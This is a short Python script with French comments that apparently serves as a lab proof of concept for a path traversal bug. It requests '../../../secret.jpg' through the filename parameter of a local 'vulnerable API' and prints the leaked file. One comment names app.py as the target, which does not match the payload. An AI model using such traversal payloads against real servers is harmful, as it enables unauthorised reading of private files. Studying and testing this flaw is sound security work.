import requests

# URL de l'API vulnérable
base_url = "http://127.0.0.1:5000/image?filename="

# Chemin relatif pour accéder à un fichier en dehors du répertoire autorisé
# Par exemple, accéder au fichier app.py à la racine du projet
payload = "../../../secret.jpg"

# Construire l'URL complète
attack_url = base_url + payload

# Faire la requête GET
response = requests.get(attack_url)

# Afficher le résultat de la requête
if response.status_code == 200:
    print("Contenu du fichier non protégé:")
    print(response.text)
else:
    print(f"Erreur: {response.status_code}")
    print(response.text)
